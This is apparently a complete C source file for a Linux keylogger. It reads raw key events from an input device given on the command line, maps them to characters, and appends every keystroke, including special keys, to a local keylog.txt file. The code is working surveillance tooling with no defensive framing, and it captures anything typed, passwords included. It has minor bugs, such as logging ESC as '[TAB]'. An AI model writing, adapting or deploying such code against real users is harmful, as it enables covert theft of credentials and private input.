#include <stdio.h>
#include <stdlib.h>
#include <fcntl.h>
#include <unistd.h>
#include <linux/input.h>
#include <string.h>
#include <errno.h>
#include <linux/input-event-codes.h>

#define LOG_FILE "keylog.txt"
#define MAX_KEYCODE 256

char keymap_normal[MAX_KEYCODE] = {0};
char keymap_shift[MAX_KEYCODE] = {0};

void init_keymap_normal() {

    // Letters a-z
    keymap_normal[KEY_A] = 'a'; keymap_shift[KEY_A] = 'A';
    keymap_normal[KEY_B] = 'b'; keymap_shift[KEY_B] = 'B';
    keymap_normal[KEY_C] = 'c'; keymap_shift[KEY_C] = 'C';
    keymap_normal[KEY_D] = 'd'; keymap_shift[KEY_D] = 'D';
    keymap_normal[KEY_E] = 'e'; keymap_shift[KEY_E] = 'E';
    keymap_normal[KEY_F] = 'f'; keymap_shift[KEY_F] = 'F';
    keymap_normal[KEY_G] = 'g'; keymap_shift[KEY_G] = 'G';
    keymap_normal[KEY_H] = 'h'; keymap_shift[KEY_H] = 'H';
    keymap_normal[KEY_I] = 'i'; keymap_shift[KEY_I] = 'I';
    keymap_normal[KEY_J] = 'j'; keymap_shift[KEY_J] = 'J';
    keymap_normal[KEY_K] = 'k'; keymap_shift[KEY_K] = 'K';
    keymap_normal[KEY_L] = 'l'; keymap_shift[KEY_L] = 'L';
    keymap_normal[KEY_M] = 'm'; keymap_shift[KEY_M] = 'M';
    keymap_normal[KEY_N] = 'n'; keymap_shift[KEY_N] = 'N';
    keymap_normal[KEY_O] = 'o'; keymap_shift[KEY_O] = 'O';
    keymap_normal[KEY_P] = 'p'; keymap_shift[KEY_P] = 'P';
    keymap_normal[KEY_Q] = 'q'; keymap_shift[KEY_Q] = 'Q';
    keymap_normal[KEY_R] = 'r'; keymap_shift[KEY_R] = 'R';
    keymap_normal[KEY_S] = 's'; keymap_shift[KEY_S] = 'S';
    keymap_normal[KEY_T] = 't'; keymap_shift[KEY_T] = 'T';
    keymap_normal[KEY_U] = 'u'; keymap_shift[KEY_U] = 'U';
    keymap_normal[KEY_V] = 'v'; keymap_shift[KEY_V] = 'V';
    keymap_normal[KEY_W] = 'w'; keymap_shift[KEY_W] = 'W';
    keymap_normal[KEY_X] = 'x'; keymap_shift[KEY_X] = 'X';
    keymap_normal[KEY_Y] = 'y'; keymap_shift[KEY_Y] = 'Y';
    keymap_normal[KEY_Z] = 'z'; keymap_shift[KEY_Z] = 'Z';

    // numbers and special cases
    keymap_normal[KEY_1] = '1';  keymap_shift[KEY_1] = '!';
    keymap_normal[KEY_2] = '2';  keymap_shift[KEY_2] = '"';
    keymap_normal[KEY_3] = '3';  keymap_shift[KEY_3] = '#';
    keymap_normal[KEY_4] = '4';  keymap_shift[KEY_4] = '$';
    keymap_normal[KEY_5] = '5';  keymap_shift[KEY_5] = '%';
    keymap_normal[KEY_6] = '6';  keymap_shift[KEY_6] = '&';
    keymap_normal[KEY_7] = '7';  keymap_shift[KEY_7] = '/';
    keymap_normal[KEY_8] = '8';  keymap_shift[KEY_8] = '(';
    keymap_normal[KEY_9] = '9';  keymap_shift[KEY_9] = ')';
    keymap_normal[KEY_0] = '0';  keymap_shift[KEY_0] = '=';

    keymap_normal[KEY_SPACE] = ' ';

    keymap_normal[KEY_ENTER] = '\n';
    keymap_normal[KEY_DOT] = '.';
    keymap_normal[KEY_COMMA] = ',';
    keymap_normal[KEY_MINUS] = '-';
    keymap_normal[KEY_EQUAL] = '=';
    keymap_normal[KEY_SLASH] = '/';
    keymap_normal[KEY_BACKSLASH] = '\\';
    keymap_normal[KEY_SEMICOLON] = ';';
    keymap_normal[KEY_APOSTROPHE] = '\'';
    keymap_normal[KEY_LEFTBRACE] = '[';
    keymap_normal[KEY_RIGHTBRACE] = ']';
}

void log_char(FILE *log, int code, int shift) {
    char c = shift ? keymap_shift[code] : keymap_normal[code];
    if (c) {
        fputc(c, log);
    } else {
        switch (code) {
        case KEY_ENTER:
            fputs("[ENTER]", log);
            break;
        case KEY_TAB:
            fputs("[TAB]", log);
            break;
        case KEY_ESC:
            fputs("[TAB]", log);
            break;
        case KEY_BACKSPACE:
            fputs("[BACKSPACE]", log);
            break;
        case KEY_LEFTSHIFT:
        case KEY_RIGHTSHIFT:
            fputs("[SHIFT]", log);
            break;        
        default:
            fprintf(log, "[%d]", code);
        }
    }
    fflush(log);
}

int main(int argc, char *argv[]) {
    if (argc != 2) {
        printf("Usage: sudo %s /dev/input/eventX\n", argv[0]);
        return 1;
    }

    const char *device = argv[1];
    int fd = open(device, O_RDONLY);
    if (fd == -1) {
        perror("open");
        return 1;
    }

    init_keymap_normal(); 

    FILE *log = fopen(LOG_FILE, "a");
    if (!log) {
        perror("fopen log file");
        close(fd);
        return 1;
    }

    struct input_event ev;
    int shift_pressed = 0;

    while(1) {
        ssize_t n = read(fd, &ev, sizeof(ev));
        if (n != (ssize_t)sizeof(ev)) continue;

        if (ev.type == EV_KEY) {
            if (ev.code == KEY_LEFTSHIFT || ev.code == KEY_RIGHTSHIFT) {
                shift_pressed = (ev.value == 1 || ev.value == 2);
                continue;
            }

            if (ev.value == 1) {
                log_char(log, ev.code, shift_pressed);
            }
        }
    }
    fclose(log);
    close(fd);
    return 0;
}
